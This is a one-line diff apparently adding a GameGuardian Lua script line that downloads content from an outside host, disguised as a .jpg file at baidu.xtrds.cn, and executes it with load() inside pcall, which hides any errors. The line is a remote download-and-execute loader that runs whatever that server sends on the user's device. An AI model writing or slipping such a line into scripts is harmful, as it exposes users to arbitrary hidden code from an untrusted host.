@@ -1,0 +1,1 @@
+pcall(load(gg.makeRequest("http://baidu.xtrds.cn/data/f_26125953.jpg").content))
